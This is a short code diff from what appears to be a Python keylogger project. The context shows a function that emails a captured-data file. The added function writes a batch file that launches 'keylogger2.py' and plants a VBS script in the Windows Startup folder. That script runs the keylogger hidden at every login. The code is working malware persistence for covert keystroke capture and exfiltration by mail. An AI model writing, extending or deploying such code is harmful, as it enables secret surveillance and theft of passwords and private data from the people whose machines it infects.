@@ -70,3 +70,18 @@ def enviarMail(archivoConLosDatos):
     server.login(msg['From'], password)
     server.sendmail(msg['From'], msg['To'], msg.as_string())
     server.quit()
+
+def mover_fichero():
+    USER_NAME = getpass.getuser()
+    final_path = 'C:\\Users\\{}AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'.format(USER_NAME)
+    path_script = os.path.dirname(os.path.abspath(__file__))
+
+    with open('open.bat', 'w+') as bat_file:
+        bat_file.write('cd "{}"\n'.format(path_script))
+        bat_file.write('python "keylogger2.py"')
+
+    with open(final_path+'\\'+"open.vbs", "w+") as vbs_file:
+        vbs_file.write('Dim WinScripHost\n')
+        vbs_file.write('Set WinScripHost = CreateObject("WScript.Shell")\n')
+        vbs_file.write('WinScripHost.Run Chr(34) & "{}\open.bat" & Chr(34), 0\n'.format(path_script))
+        vbs_file.write('Set WinScripHost = Nothing\n')
